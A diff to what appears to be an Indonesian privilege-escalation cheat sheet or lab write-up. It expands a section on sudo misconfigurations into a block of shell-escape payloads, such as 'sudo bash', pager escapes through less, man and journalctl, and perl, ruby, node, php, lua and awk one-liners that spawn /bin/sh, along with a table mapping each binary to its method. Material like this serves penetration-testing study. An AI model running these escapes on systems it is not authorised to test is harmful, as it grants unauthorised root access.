@@ -103,20 +103,41 @@ sudo less /etc/profile
 !/bin/sh 
 ```
 
-| Binary | Metode | Catatan |
-|--------|--------|---------|
-| `vim` | `:!/bin/sh` | Command‑mode shell |
-| `less`/`more` | `!command` | Pager shell escape |
-| `find` | `-exec` | Executes arbitrary command |
-| `python3` | `os.system` | Spawn shell via Python |
-| `env` | `/bin/sh` | Runs shell via env utility |
-| `awk` | `system("/bin/sh")` | Spawn shell via awk |
-
-Payload tambahan:
+Payload lengkap per binary (semua entry di tampilan rentan):
 
 ```bash
-sudo awk 'BEGIN{system("/bin/sh")}'                # awk usr/bin/awk
+# --- shell langsung ---
+sudo bash
+
+# --- editor & pager (ketik !/bin/sh di dalam pager) ---
+sudo less /etc/profile        # less/more → !/bin/sh
+sudo man man                  # man → !/bin/sh
+sudo journalctl               # output panjang dibuka via pager → !/bin/sh
+
+# --- interpreter ---
+sudo perl -e 'exec "/bin/sh"'
+sudo ruby -e 'exec "/bin/sh"'
+sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: "inherit"})'
+sudo php -r 'pcntl_exec("/bin/sh", ["-p"]);'
+sudo lua -e 'os.execute("/bin/sh")'
+sudo awk 'BEGIN{system("/bin/sh")}'
 ```
+
+| Binary | Metode | Catatan |
+|--------|--------|---------|
+| `bash`/`sh`/`zsh` | `sudo bash` | Langsung root shell |
+| `env` | `sudo env /bin/sh` | Runs shell via env utility |
+| `vim` | `:!/bin/sh` | Command‑mode shell |
+| `less`/`more` | `!command` | Pager shell escape |
+| `man`/`journalctl` | `!command` di dalam pager | Pager dibuka otomatis |
+| `find` | `-exec` | Executes arbitrary command |
+| `python3` | `os.system` | Spawn shell via Python |
+| `perl` | `exec "/bin/sh"` | Spawn shell via Perl |
+| `ruby` | `exec "/bin/sh"` | Spawn shell via Ruby |
+| `node` | `spawn("/bin/sh")` | Spawn shell via Node |
+| `php` | `pcntl_exec` | Spawn shell via PHP |
+| `lua` | `os.execute("/bin/sh")` | Spawn shell via Lua |
+| `awk` | `system("/bin/sh")` | Spawn shell via awk |
 
 > Sudo aman dari **dash‑drop** (ruid=euid=0 saat command benar‑benar dijalankan sebagai root).
 
